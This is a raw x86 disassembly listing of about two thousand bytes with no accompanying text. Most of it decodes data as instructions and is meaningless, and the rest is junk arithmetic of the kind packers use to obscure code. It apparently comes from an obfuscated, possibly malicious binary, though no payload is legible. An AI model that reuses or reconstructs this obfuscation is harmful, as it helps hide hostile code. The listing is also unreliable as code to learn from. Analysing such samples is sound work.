  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xbe2fb540
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    cl,ah
  41719f:	outs   dx,DWORD PTR ds:[esi]
  4171a0:	je     0x417198
  4171a2:	repz sbb al,bh
  4171a5:	xor    DWORD PTR [edx+0x21f8329d],eax
  4171ab:	mov    esp,0xb9153ce7
  4171b0:	dec    ecx
  4171b1:	xor    eax,0x11fae933
  4171b6:	xor    DWORD PTR [esi-0xbf6e7ec],0x38
  4171bd:	pop    ecx
  4171be:	jne    0x4171c3
  4171c0:	jl     0x41718c
  4171c2:	les    ebx,FWORD PTR [ecx+ebp*8]
  4171c5:	out    dx,al
  4171c6:	pusha  
  4171c7:	mov    ah,0xc7
  4171c9:	and    BYTE PTR [ebp-0x140021ad],0x48
  4171d0:	and    esi,DWORD PTR [edi-0x596cb846]
  4171d6:	aaa    
  4171d7:	pop    es
  4171d8:	jp     0x4171d1
  4171da:	or     eax,0x5ee1fe3f
  4171df:	mov    ch,0x10
  4171e1:	add    esp,esi
  4171e3:	ins    DWORD PTR es:[edi],dx
  4171e4:	pop    edi
  4171e5:	mov    bh,0x34
  4171e7:	mul    BYTE PTR [ecx+eiz*2-0x33084e0d]
  4171ee:	mov    dl,0xbe
  4171f0:	test   ah,ah
  4171f2:	out    0xd4,al
  4171f4:	fucomp st(6)
  4171f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171f7:	out    0xe5,al
  4171f9:	or     BYTE PTR [ebx-0x2c50f3ba],bh
  4171ff:	mov    ah,0xfa
  417201:	add    BYTE PTR [ecx+0x32871e2c],bl
  417207:	and    al,0x6e
  417209:	sub    eax,0xd700dba2
  41720e:	mov    ebp,0x47b33ad2
  417213:	imul   ecx,DWORD PTR [ebx-0x6c],0xffffff92
  417217:	pop    ebp
  417218:	push   ds
  417219:	pushf  
  41721a:	push   esp
  41721b:	jmp    0x4171a3
  41721d:	(bad)  
  41721f:	jbe    0x417241
  417221:	mov    bl,0x3e
  417223:	jno    0x41726c
  417225:	int    0x6c
  417227:	fisubr DWORD PTR ds:0x924e49e8
  41722d:	xor    BYTE PTR [edx-0x6f125c87],ch
  417233:	mov    cl,0xa6
  417235:	push   ss
  417236:	push   esi
  417237:	dec    ebp
  417238:	mov    esp,0xc8a431a0
  41723d:	fisubr DWORD PTR [edx]
  41723f:	repz inc edx
  417241:	mov    bh,0x77
  417243:	enter  0x4626,0xaa
  417247:	adc    eax,0x5e724c6b
  41724c:	mov    eax,ds:0xefee3099
  417252:	push   es
  417253:	mov    cl,0x98
  417255:	gs sub al,0x30
  417258:	jmp    0xf5335b1c
  41725d:	lea    esi,[eax]
  41725f:	out    dx,al
  417260:	dec    esi
  417261:	lahf   
  417262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417263:	cmp    BYTE PTR [edi],dl
  417265:	mov    esp,0x7ff28e88
  41726a:	xor    DWORD PTR [esi+0xb046860],edi
  417270:	shl    BYTE PTR [esi-0x2e],1
  417273:	loop   0x417224
  417275:	xor    al,0xc2
  417277:	std    
  417278:	dec    edi
  417279:	inc    edx
  41727a:	imul   esi,esp,0xedb67982
  417280:	cmp    al,0xfe
  417282:	sub    al,0x56
  417284:	ins    BYTE PTR es:[edi],dx
  417285:	das    
  417286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417287:	mov    esp,0xaa129eb6
  41728c:	enter  0xd7ee,0x42
  417290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417291:	lds    ebp,FWORD PTR [eax+0x5c]
  417294:	retf   0xceb1
  417297:	sub    esi,eax
  417299:	push   ebx
  41729a:	repnz cmp eax,0x97b96f3c
  4172a0:	pop    ecx
  4172a1:	jb     0x4172fa
  4172a3:	stos   DWORD PTR es:[edi],eax
  4172a4:	or     al,0x95
  4172a6:	mov    bh,0x16
  4172a8:	fcomp  DWORD PTR [ebx]
  4172aa:	mov    ch,0x4e
  4172ac:	outs   dx,DWORD PTR ds:[esi]
  4172ad:	xchg   ecx,eax
  4172ae:	dec    eax
  4172af:	jae    0x417305
  4172b1:	or     BYTE PTR [esi+eiz*4],ah
  4172b4:	and    ebx,0x3dbdc47d
  4172ba:	sub    al,0x58
  4172bc:	into   
  4172bd:	rcl    BYTE PTR [ebp+0x3b],0xa
  4172c1:	pop    edi
  4172c2:	adc    BYTE PTR [ecx],al
  4172c4:	add    eax,0x8c0ba129
  4172c9:	loope  0x4172d9
  4172cb:	cmp    al,0x2
  4172cd:	fmul   QWORD PTR [esi]
  4172cf:	popf   
  4172d0:	sub    al,0xc
  4172d2:	lods   eax,DWORD PTR ds:[esi]
  4172d3:	dec    ebp
  4172d4:	push   ss
  4172d5:	inc    edx
  4172d6:	int3   
  4172d7:	push   esp
  4172d8:	pop    ebx
  4172d9:	shl    DWORD PTR [esi],cl
  4172db:	pop    esi
  4172dc:	or     esi,ebx
  4172de:	mov    bh,0xe7
  4172e0:	in     eax,dx
  4172e1:	shr    DWORD PTR [edi],cl
  4172e3:	sbb    esi,DWORD PTR es:[edi-0x6b]
  4172e7:	retf   
  4172e8:	stc    
  4172e9:	lods   al,BYTE PTR ds:[esi]
  4172ea:	lods   al,BYTE PTR ds:[esi]
  4172eb:	test   ecx,0x7c059c89
  4172f1:	sahf   
  4172f2:	mov    cl,0xf8
  4172f4:	sub    eax,0x32430af3
  4172f9:	fcomip st,st(7)
  4172fb:	or     dh,BYTE PTR [ebx-0x20380362]
  417301:	ja     0x4172c8
  417303:	sub    eax,0x538bdb54
  417309:	pop    es
  41730a:	rcr    edx,cl
  41730c:	pop    es
  41730d:	cwde   
  41730e:	pop    esp
  41730f:	aad    0xce
  417311:	cdq    
  417312:	enter  0x90bb,0x89
  417316:	sub    al,0xf
  417318:	retf   
  417319:	loop   0x417340
  41731b:	aas    
  41731c:	out    dx,al
  41731d:	mov    eax,ds:0xf8bfc9df
  417322:	mov    ds:0x3b3c323c,al
  417327:	ins    DWORD PTR es:[edi],dx
  417328:	xchg   edi,eax
  417329:	gs push 0x6
  41732c:	sbb    BYTE PTR [ebp-0x5c31480f],dl
  417332:	mov    dh,0xb1
  417334:	mov    ds:0x8c963db6,al
  417339:	test   al,0xb1
  41733b:	ror    BYTE PTR [edx-0x69],0xe2
  41733f:	test   eax,0xf1944238
  417344:	inc    ebx
  417345:	daa    
  417346:	mov    ch,0xba
  417348:	add    ebx,edi
  41734a:	inc    eax
  41734b:	dec    esi
  41734c:	cmp    esi,esi
  41734e:	arpl   WORD PTR [eax],bp
  417350:	cmp    DWORD PTR [eax+edi*4],ebp
  417353:	je     0x4172fb
  417355:	xchg   edi,eax
  417356:	ror    DWORD PTR [eax-0x39],cl
  417359:	aaa    
  41735a:	mov    dh,0x6
  41735c:	(bad)  
  41735d:	fpatan 
  41735f:	aas    
  417360:	das    
  417361:	inc    ecx
  417362:	imul   ecx,DWORD PTR [edx],0x1f76a9c0
  417368:	pop    DWORD PTR ds:0xd045653
  41736e:	ret    
  41736f:	pop    ebx
  417370:	xchg   DWORD PTR [edi],edi
  417372:	in     eax,dx
  417373:	popf   
  417374:	inc    ebp
  417375:	fcomp  DWORD PTR [edx-0x4a]
  417378:	push   0xe8637222
  41737d:	xor    BYTE PTR [eax+0x36],cl
  417380:	into   
  417381:	xor    eax,0x5b9d67dd
  417386:	lods   eax,DWORD PTR ds:[esi]
  417387:	mov    ds:0x163652d4,eax
  41738c:	sbb    ch,dh
  41738e:	aam    0xdc
  417390:	mov    esp,0x86629dfa
  417395:	pop    ss
  417396:	dec    ecx
  417397:	mov    ebp,0xbee3929d
  41739c:	mov    eax,0xeef3917f
  4173a1:	xchg   edi,eax
  4173a2:	dec    ecx
  4173a3:	push   esi
  4173a4:	mov    eax,ds:0x2357fe0e
  4173a9:	sub    DWORD PTR [eax],ebx
  4173ab:	xchg   ecx,eax
  4173ac:	stos   BYTE PTR es:[edi],al
  4173ad:	in     eax,0x27
  4173af:	gs and eax,0x93ed517b
  4173b5:	pop    edi
  4173b6:	sbb    eax,0x27cdc1ec
  4173bb:	call   edx
  4173bd:	and    BYTE PTR [edx+0x2],ch
  4173c0:	mov    al,0x3a
  4173c2:	xchg   ah,dl
  4173c4:	jp     0x4173bb
  4173c6:	ins    BYTE PTR es:[edi],dx
  4173c7:	ss retf 0xfdc
  4173cb:	dec    edi
  4173cc:	mov    dh,0x36
  4173ce:	(bad)  
  4173cf:	std    
  4173d0:	xor    eax,0x71b0bf88
  4173d5:	cmp    edi,DWORD PTR [ecx+ecx*4+0x15a667d0]
  4173dc:	shr    BYTE PTR [ebp+0x1d],0x34
  4173e0:	into   
  4173e1:	jmp    FWORD PTR [esp+eiz*8]
  4173e4:	and    DWORD PTR [edi+eax*4-0x1dfcfe58],edx
  4173eb:	shl    BYTE PTR [edi+0x2268877d],cl
  4173f1:	jns    0x417417
  4173f3:	es adc al,0xe0
  4173f6:	cmp    BYTE PTR [esi-0x5d723154],0xae
  4173fd:	das    
  4173fe:	inc    esp
  4173ff:	pop    edx
  417400:	mov    ds:0xdb6bf428,al
  417405:	jbe    0x41742d
  417407:	pop    eax
  417408:	mov    al,ds:0xeec1f1bc
  41740d:	or     eax,0xa497a30f
  417412:	sbb    eax,0x553bcc9e
  417417:	sub    BYTE PTR [esi+0x75],bl
  41741a:	imul   esp,edi,0xc
  41741d:	call   0x440db0e8
  417422:	ret    
  417423:	dec    ebx
  417424:	ins    DWORD PTR es:[edi],dx
  417425:	or     eax,0xb165b184
  41742a:	fld    TBYTE PTR [edi]
  41742c:	outs   dx,DWORD PTR ds:[esi]
  41742d:	stos   DWORD PTR es:[edi],eax
  41742e:	test   eax,0xf65cf6cb
  417433:	and    BYTE PTR [esi-0x6959c3b2],0x71
  41743a:	pop    ecx
  41743b:	cmp    eax,0xed5db77
  417440:	inc    edi
  417441:	dec    edi
  417442:	cld    
  417443:	loop   0x4173d8
  417445:	pushf  
  417446:	sar    BYTE PTR [ebx+edi*2],0x8c
  41744a:	or     al,0x3
  41744c:	gs jo  0x4173f9
  41744f:	and    al,0xfe
  417451:	icebp  
  417452:	dec    esp
  417453:	pop    eax
  417454:	ja     0x41748a
  417456:	jmp    0xdc79fbc2
  41745b:	mov    dl,0x3d
  41745d:	mov    ds:0x85caffff,al
  417462:	shr    BYTE PTR [esi],1
  417464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417465:	push   edx
  417466:	dec    eax
  417467:	iret   
  417468:	mov    ds:0x5bc2844c,al
  41746d:	push   esi
  41746e:	xlat   BYTE PTR ds:[ebx]
  41746f:	sbb    esp,ebx
  417471:	mov    bl,0x7
  417473:	sub    al,BYTE PTR [ebp-0x10d6c170]
  417479:	inc    ecx
  41747a:	mov    dl,0xf5
  41747c:	in     eax,0xd3
  41747e:	jno    0x417433
  417480:	mov    edi,0x54372075
  417485:	adc    eax,0xe47dd455
  41748a:	mul    DWORD PTR [eax-0x4391d4f2]
  417490:	dec    BYTE PTR [ecx]
  417492:	ret    0x813e
  417495:	sti    
  417496:	mov    ebp,0xae0ba5d5
  41749b:	cmp    DWORD PTR [edi+edx*1],esi
  41749e:	test   DWORD PTR [edi],ebx
  4174a0:	ret    0x24ff
  4174a3:	stos   BYTE PTR es:[edi],al
  4174a4:	pop    ecx
  4174a5:	lds    eax,FWORD PTR [esi+eiz*8+0x39]
  4174a9:	mov    ds:0x9f62403c,eax
  4174ae:	les    ebp,FWORD PTR [ebx+0x3f745bf6]
  4174b4:	or     ebx,DWORD PTR [edx+0x23]
  4174b7:	xchg   esp,eax
  4174b8:	ss push edx
  4174ba:	push   0x4e
  4174bc:	jp     0x4174ac
  4174be:	pop    edx
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x422414
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428eb0
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422400
  417502:	call   DWORD PTR ds:0x428ed4
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428ebc
  41750f:	mov    ecx,DWORD PTR ds:0x4227c8
  417515:	sub    DWORD PTR ds:0x42834f,0x4283cb
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [eax+ecx*1+0xa6a496b]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1-0x6b00e7e8],bh
  41753e:	retf   0x626
  417541:	push   0xdd0d4762
  417546:	pop    esi
  417547:	sub    eax,0x5d1b5762
  41754c:	je     0x41759b
  41754e:	dec    ebp
  41754f:	popf   
  417550:	pop    esi
  417551:	mov    dh,dl
  417553:	ret    
  417554:	dec    edi
  417555:	mov    dh,0x66
  417557:	lods   eax,DWORD PTR ds:[esi]
  417558:	out    dx,al
  417559:	jg     0x4174f9
  41755b:	push   ecx
  41755c:	neg    DWORD PTR [edx-0x39]
  41755f:	or     esi,DWORD PTR [esi]
  417561:	dec    edx
  417562:	pop    ebp
  417563:	mov    BYTE PTR [ebp+0x1e],al
  417566:	in     al,0xbe
  417568:	mov    ah,0x90
  41756a:	test   BYTE PTR [ebx],dl
  41756c:	push   ss
  41756d:	sahf   
  41756e:	add    bh,BYTE PTR [esi-0x26]
  417571:	out    0x76,al
  417573:	xlat   BYTE PTR ds:[ebx]
  417574:	sbb    al,0x75
  417576:	jp     0x417555
  417578:	das    
  417579:	mov    esi,ecx
  41757b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41757c:	pop    ebx
  41757d:	dec    ebp
  41757e:	push   edx
  41757f:	mov    ch,0x74
  417581:	stc    
  417582:	mov    esi,0x40223a48
  417587:	push   ecx
  417588:	stos   BYTE PTR es:[edi],al
  417589:	std    
  41758a:	xchg   esp,eax
  41758b:	into   
  41758c:	mov    bl,0x44
  41758e:	lods   al,BYTE PTR ds:[esi]
  41758f:	xchg   edi,eax
  417590:	pushf  
  417591:	cdq    
  417592:	lock mov eax,DWORD PTR fs:[esi]
  417596:	(bad)  
  417597:	loopne 0x41760f
  417599:	int    0x89
  41759b:	stos   BYTE PTR es:[edi],al
  41759c:	push   0xffffff84
  41759e:	out    0x6a,eax
  4175a0:	(bad)  
  4175a1:	sub    eax,0xacbcbf27
  4175a6:	adc    DWORD PTR [edi-0x1c],esp
  4175a9:	add    al,0xda
  4175ab:	js     0x417585
  4175ad:	retf   
  4175ae:	jmp    0xfd86:0x220aa2c5
  4175b5:	sub    eax,0x83b93fcf
  4175ba:	add    al,0xb7
  4175bc:	dec    edi
  4175bd:	mov    DWORD PTR [ecx+0x52],eax
  4175c0:	jb     0x4175fe
  4175c2:	stos   BYTE PTR es:[edi],al
  4175c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175c4:	(bad)  
  4175c5:	mov    dh,0x43
  4175c7:	rcr    BYTE PTR [edi+ebx*8-0x6c0bbf57],0xa4
  4175cf:	xor    ch,BYTE PTR [ebx-0x25]
  4175d2:	lock scas eax,DWORD PTR es:[edi]
  4175d4:	ins    BYTE PTR es:[edi],dx
  4175d5:	fstp   st(5)
  4175d7:	ds dec eax
  4175d9:	push   edx
  4175da:	and    BYTE PTR [edx-0x28dfbbbd],dh
  4175e0:	test   ah,ch
  4175e2:	pop    edi
  4175e3:	out    0x8f,eax
  4175e5:	je     0x417590
  4175e7:	jecxz  0x417631
  4175e9:	xor    edi,DWORD PTR [edx-0x3f]
  4175ec:	clc    
  4175ed:	push   esp
  4175ee:	ins    BYTE PTR es:[edi],dx
  4175ef:	push   0x20
  4175f1:	mov    al,al
  4175f3:	repz icebp 
  4175f5:	adc    al,0x69
  4175f7:	adc    edi,ebp
  4175f9:	and    BYTE PTR [eax],dh
  4175fb:	out    dx,al
  4175fc:	mov    bl,0x71
  4175fe:	jns    0x41760d
  417600:	fdiv   DWORD PTR [eax+edi*2]
  417603:	mov    edi,DWORD PTR [ecx]
  417605:	push   eax
  417606:	lahf   
  417607:	hlt    
  417608:	repz ja 0x4175fe
  41760b:	aad    0x3c
  41760d:	lds    edi,FWORD PTR [ecx]
  41760f:	outs   dx,DWORD PTR ds:[esi]
  417610:	shl    cl,0x4b
  417613:	inc    ecx
  417614:	fst    QWORD PTR [edi]
  417616:	iret   
  417617:	cmp    DWORD PTR [edx-0x5115de1],ebp
  41761d:	jne    0x4175f6
  41761f:	jo     0x417621
  417621:	and    eax,0x183fb503
  417626:	cmc    
  417627:	test   dh,bl
  417629:	aaa    
  41762a:	push   edx
  41762b:	cdq    
  41762c:	fs adc al,0x17
  41762f:	push   edx
  417630:	dec    esi
  417631:	push   edi
  417632:	es jo  0x4176b3
  417635:	dec    edx
  417636:	sbb    BYTE PTR ds:0x178466eb,cl
  41763c:	sub    BYTE PTR [ebp+0x4e],0xd2
  417640:	repnz push ebx
  417642:	jnp    0x417660
  417644:	fild   QWORD PTR [edi+0x44]
  417647:	test   al,0x6
  417649:	aas    
  41764a:	lahf   
  41764b:	mov    dl,0x91
  41764d:	jno    0x417672
  41764f:	lea    eax,[ebx+edx*2+0x4c]
  417653:	push   ecx
  417654:	push   ebp
  417655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417656:	adc    bh,BYTE PTR [esi-0x7c110548]
  41765c:	xor    eax,0x47869c61
  417661:	cld    
  417662:	cli    
  417663:	cmp    DWORD PTR [ecx],eax
  417665:	add    ebp,DWORD PTR [esi]
  417667:	cmp    eax,0x896b223
  41766c:	xchg   edx,eax
  41766d:	sti    
  41766e:	pop    es
  41766f:	jne    0x4176a7
  417671:	icebp  
  417672:	jg     0x4176f2
  417674:	push   es
  417675:	in     al,0xd0
  417677:	mov    al,0x64
  417679:	retf   0x9c05
  41767c:	push   ebp
  41767d:	or     bh,cl
  41767f:	dec    ebx
  417680:	nop
  417681:	sbb    ah,BYTE PTR [ebx+0x1]
  417684:	jbe    0x417682
  417686:	int3   
  417687:	add    ebx,DWORD PTR [ebp-0x63dc2a51]
  41768d:	and    al,0xd1
  41768f:	sti    
  417690:	(bad)  [eax+ebx*8+0x44e39e55]
  417697:	(bad)  
  417698:	mov    esi,0x753888e0
  41769d:	je     0x4176b2
  41769f:	inc    edi
  4176a0:	mov    edx,gs
  4176a2:	fisttp DWORD PTR [ebx+0x65938a98]
  4176a8:	pop    es
  4176a9:	ins    BYTE PTR es:[edi],dx
  4176aa:	rcr    BYTE PTR [eax+0x11],cl
  4176ad:	sub    BYTE PTR [edx+0x610a1aaa],bl
  4176b3:	or     eax,0x54d883ab
  4176b8:	neg    DWORD PTR [ecx]
  4176ba:	xor    eax,0x6425f6a2
  4176bf:	sti    
  4176c0:	mov    edx,0x3413758d
  4176c5:	(bad)  
  4176c6:	xchg   ecx,eax
  4176c7:	jp     0x417747
  4176c9:	cdq    
  4176ca:	xor    BYTE PTR [ebp+0x25848c57],dl
  4176d0:	aas    
  4176d1:	scas   eax,DWORD PTR es:[edi]
  4176d2:	rcl    BYTE PTR [ebp+0x5defdc70],1
  4176d8:	ins    DWORD PTR es:[edi],dx
  4176d9:	iret   
  4176da:	je     0x4176a9
  4176dc:	(bad)  
  4176dd:	iret   
  4176de:	(bad)  
  4176df:	fist   WORD PTR [ecx]
  4176e1:	mov    esp,DWORD PTR [eax+0x4f9c2224]
  4176e7:	iret   
  4176e8:	pop    esp
  4176e9:	and    bh,bl
  4176eb:	adc    al,0x1c
  4176ed:	aam    0x7e
  4176ef:	call   0xb54ce170
  4176f4:	data16 cld 
  4176f6:	and    edx,ecx
  4176f8:	lds    edx,FWORD PTR [ecx+ecx*2+0xd]
  4176fc:	inc    eax
  4176fd:	test   eax,0x507f8445
  417702:	fcomp  DWORD PTR [edx+0x4f48d0ac]
  417708:	loopne 0x41768d
  41770a:	cmp    eax,esp
  41770c:	mov    edx,eax
  41770e:	or     al,0xed
  417710:	mov    ecx,0xd777fcb2
  417715:	xchg   DWORD PTR [eax],ecx
  417717:	mov    al,0x4d
  417719:	mov    dh,0x5f
  41771b:	xchg   bh,bl
  41771d:	jae    0x4176e5
  41771f:	dec    ecx
  417720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417721:	inc    ecx
  417722:	push   esp
  417723:	sbb    BYTE PTR [ecx+0x194b01a],bl
  417729:	test   eax,0x181de60
  41772e:	push   esi
  41772f:	cmp    al,0x9b
  417731:	shl    edi,cl
  417733:	call   0x5de7:0xe3e35490
  41773a:	jmp    0xa368:0x1e27e78e
  417741:	cmp    esp,esp
  417743:	fcom   DWORD PTR [ecx+ecx*2+0x26]
  417747:	jg     0x417773
  417749:	xor    BYTE PTR [edx],0xe4
  41774c:	xchg   esi,eax
  41774d:	xor    edx,DWORD PTR ds:0xdf199a5d
  417753:	or     BYTE PTR ds:0x71f9c091,bl
  417759:	mov    dh,BYTE PTR [ecx+0x383da2]
  41775f:	inc    edi
  417760:	xor    bh,BYTE PTR [eax-0x2e]
  417763:	xor    eax,0x6c9b001b
  417768:	and    BYTE PTR [eax+0x288eac87],bl
  41776e:	and    eax,0x5d0f1789
  417773:	jmp    0xc032:0x9dc8cf84
  41777a:	xchg   ebp,eax
  41777c:	sti    
  41777d:	push   ds
  41777e:	dec    esp
  41777f:	pop    ds
  417780:	imul   eax,DWORD PTR [ebp-0xdc8220f],0x611b9e57
  41778a:	test   DWORD PTR [edx+eiz*1],0xbd56e1cd
  417791:	xor    eax,0xf07d4d5f
  417796:	mov    ecx,0xa8264ad2
  41779b:	dec    ecx
  41779c:	mov    ebp,0x2e4fcb14
  4177a1:	dec    eax
  4177a2:	dec    eax
  4177a3:	or     BYTE PTR [edi],0x78
  4177a6:	sbb    BYTE PTR [edx+0xc272acd],al
  4177ac:	dec    ecx
  4177ad:	neg    DWORD PTR [esi-0x5d]
  4177b0:	pop    ebp
  4177b1:	fdiv   QWORD PTR [edx]
  4177b3:	xchg   ecx,eax
  4177b4:	loope  0x417835
  4177b6:	adc    al,0x83
  4177b8:	mov    eax,0xc9b3e57f
  4177bd:	xor    bl,BYTE PTR [edx+0x2071414b]
  4177c3:	retf   0x12ed
  4177c6:	icebp  
  4177c7:	jb     0x4177e8
  4177c9:	fimul  DWORD PTR [esi]
  4177cb:	leave  
  4177cc:	(bad)  
  4177cd:	out    0xbc,al
  4177cf:	stc    
  4177d0:	nop
  4177d1:	pop    ss
  4177d2:	bound  esp,QWORD PTR [esi+ebp*8-0x4d88d3c1]
  4177d9:	and    DWORD PTR [edi+esi*2],ebx
  4177dc:	and    al,0xb9
  4177de:	push   eax
  4177df:	std    
  4177e0:	jb     0x417789
  4177e2:	pop    ebx
  4177e3:	lock sbb ah,BYTE PTR [eax]
  4177e6:	fs dec ebp
  4177e8:	or     BYTE PTR [ebx-0x45a16405],bl
  4177ee:	pushf  
  4177ef:	and    al,0x5e
  4177f1:	pop    ds
  4177f2:	add    dh,BYTE PTR [ecx+0x6b]
  4177f5:	fidivr DWORD PTR [ebx+0x13]
  4177f8:	cmp    BYTE PTR [esi],al
  4177fa:	sti    
  4177fb:	test   eax,0xd24712e1
  417800:	out    dx,eax
  417801:	mov    dh,BYTE PTR [ebp-0x2f]
  417804:	dec    ebp
  417805:	call   0xa8c5:0x68ab4133
  41780c:	adc    BYTE PTR [ecx+0x71d36879],bl
  417812:	icebp  
  417813:	mov    al,ds:0x6f18b9f
  417818:	push   ss
  417819:	out    dx,eax
  41781a:	in     al,0x5d
  41781c:	scas   al,BYTE PTR es:[edi]
  41781d:	fnstcw WORD PTR [ecx+0x815fed9]
  417823:	mov    al,0x78
  417825:	iret   
  417826:	mov    WORD PTR [esi-0x1e],es
  417829:	lahf   
  41782a:	jne    0x41787d
  41782c:	test   BYTE PTR [ecx-0x2b00d49],0x35
  417833:	inc    edx
  417834:	mov    ds:0xcfb1bd0a,eax
  417839:	out    0xb2,al
  41783b:	mov    ebx,0xaf3b26be
  417840:	in     eax,0x2
  417842:	mov    dl,0x75
  417844:	pushf  
  417845:	adc    BYTE PTR [esi],al
  417847:	or     eax,0x6044a8ae
  41784c:	inc    ebx
  41784d:	xor    eax,DWORD PTR [esi+0x20dd4b18]
  417853:	adc    eax,0x764a2d22
  417858:	mov    cl,0x56
  41785a:	push   edi
  41785b:	hlt    
  41785c:	xchg   ebp,eax
  41785d:	ja     0x4178dc
  41785f:	fistp  WORD PTR [edx+0x37afb443]
  417865:	inc    ebp
  417866:	out    dx,eax
  417867:	shr    DWORD PTR [ecx+0x5c],0xcc
  41786b:	in     al,0x66
  41786d:	pop    DWORD PTR [ebx+0x62808e63]
  417873:	sar    BYTE PTR [eax],0x55
  417876:	fisubr WORD PTR [eax]
  417878:	fadd   DWORD PTR [ebp+0x36a70d5c]
  41787e:	fucomi st,st(1)
  417880:	test   BYTE PTR [eax+0x12a77fc4],0x94
  417887:	aam    0x1e
  417889:	cmp    BYTE PTR [esp+esi*2+0x67945ac],dh
  417890:	push   ds
  417891:	inc    ecx
  417892:	das    
  417893:	jecxz  0x4178d0
  417895:	mov    esp,DWORD PTR [esi-0x15]
  417898:	jle    0x41787e
  41789a:	add    BYTE PTR [esi+0x3a],dl
  41789d:	mov    dh,0x6c
  41789f:	dec    esi
  4178a0:	test   BYTE PTR [esi-0x36b7b732],bh
  4178a6:	cwde   
  4178a7:	push   edi
  4178a8:	lock fsubr QWORD PTR [eax]
  4178ab:	pop    eax
  4178ac:	mov    dh,0xf3
  4178ae:	cmp    ebp,ebp
  4178b0:	sbb    ebp,DWORD PTR [eax-0x178eff01]
  4178b6:	ret    0x8b00
  4178b9:	or     esp,esi
  4178bb:	shr    dl,0x5c
  4178be:	mov    esi,0x91b420e6
  4178c3:	dec    esi
  4178c4:	dec    edx
  4178c5:	dec    edi
  4178c6:	dec    ebp
  4178c7:	sahf   
  4178c8:	inc    ebp
  4178c9:	ror    BYTE PTR [esi+0x40],cl
  4178cc:	sti    
  4178cd:	or     ebx,ebp
  4178cf:	dec    edi
  4178d0:	fistp  DWORD PTR [esi+0x2d9c2ee7]
  4178d6:	mov    BYTE PTR [eax+0x3867a3b8],ch
  4178dc:	or     BYTE PTR [eax+0x55],cl
  4178df:	jno    0x41791c
  4178e1:	je     0x4178cb
  4178e3:	xchg   BYTE PTR [eax],cl
  4178e5:	add    dl,ch
  4178e7:	fwait
  4178e8:	jno    0x4178d9
  4178ea:	mov    esi,0x6a4ef13c
  4178ef:	add    BYTE PTR [ecx+0x4282e725],al
  4178f5:	add    BYTE PTR [esi-0xffff91],dh
  4178fb:	xor    DWORD PTR [ecx+0x4282870d],eax
  417901:	add    BYTE PTR [edi],ch
  417903:	add    BYTE PTR gs:[eax],al
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42829f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428287,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x428327
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x4282ef,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42829f,0x4282a7
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428363,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x4282bf,0x4281eb
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x4281ab,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x4282af,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x4282eb,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283f7
  4179bb:	add    DWORD PTR ds:0x4281bb,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x4282e3,0x705
  4179d3:	sub    ecx,eax
